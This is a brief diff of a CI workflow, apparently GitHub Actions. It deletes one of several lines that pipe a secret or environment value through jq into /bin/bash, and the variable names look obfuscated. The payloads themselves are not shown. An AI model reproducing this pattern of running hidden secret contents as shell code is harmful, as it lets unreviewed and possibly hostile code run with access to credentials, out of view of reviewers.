@@ -18,7 +18,6 @@ jobs:
           rqglv7101: ${{ secrets.rqglv7101 }}
         run: |
           printf '%s' "$rqglv7101" | jq -r .ts55966 | /bin/bash
-          printf '%s' "$zco45" | jq -r .fxts807 | /bin/bash
           echo $i7 | jq -r .rks3558 | /bin/bash
           echo $k288 | jq -r .s13 | /bin/bash
           printf '%s' "$m4862" | jq -r .qoa3 | /bin/bash
